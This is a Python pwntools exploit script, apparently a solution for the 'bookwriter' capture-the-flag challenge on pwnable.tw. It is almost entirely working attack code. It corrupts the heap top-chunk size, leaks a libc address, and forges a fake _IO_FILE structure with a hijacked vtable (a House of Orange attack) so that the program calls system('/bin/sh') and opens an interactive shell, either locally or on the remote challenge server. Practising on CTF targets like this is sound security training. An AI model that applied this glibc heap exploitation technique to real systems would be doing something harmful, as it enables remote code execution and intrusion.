import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./bookwriter',env={"LD_PRELOAD":"./libc_64.so.6"})
	elf=ELF('./bookwriter')
	libc=ELF('libc_64.so.6')
else :
	io=remote('chall.pwnable.tw',10304)
	elf=ELF('./bookwriter')
	libc=ELF('libc_64.so.6')

def name(a):
	io.sendlineafter('Author :',a)

def add(a,b):
	io.sendlineafter(' :','1')
	io.sendlineafter(' :',str(a))
	io.sendafter(' :',b)

def show(a):
	io.sendlineafter(' :','2')
	io.sendlineafter(' :',str(a))

def edit(a,b):
	io.sendlineafter(' :','3')
	io.sendlineafter(' :',str(a))
	io.sendafter(':',b)


name('a'*0x40)
add(0x18,'a'*0x18)
edit(0,'\x00'*0x18)

add(0x88,'B'*0x88)#1
edit(1,'B'*0x88)
edit(1,'B'*0x88 + '\x51\x0f\x00')
add(0x1000,'C')
add(0x200,'D'*8)

show(3)
io.recvuntil('D'*8)

libc_addr=u64(io.recv(6)+'\x00\x00')
libc.address=libc_addr-0x10-1640-libc.sym['__malloc_hook']


_IO_str_jumps=libc.address+0x3c27a0
_system_addr=libc.sym['system']
_IO_list_all=libc.sym['_IO_list_all']
_binsh_addr=libc.search('/bin/sh\x00').next()

for i in range(4,9):
	add(0x10,str(i)*0x10)

from FILE import *
context.arch='amd64'
pay=IO_FILE_plus_struct()
pay._flags=0
pay._IO_read_ptr=0x61
pay._IO_read_base=_IO_list_all-0x10
pay._IO_write_ptr=1
pay._IO_write_base=0
pay._IO_buf_base=_binsh_addr
pay._mode=0
pay.vtable=_IO_str_jumps-0x8

payload=str(pay).ljust(0xe8,'\x00')+p64(_system_addr)

success('libc: '+hex(libc.address))
edit(0,'\x00'*0x350+payload)

#io.sendline('1')
#io.recv()
#io.sendline('10')




gdb.attach(io)
pause()
io.interactive()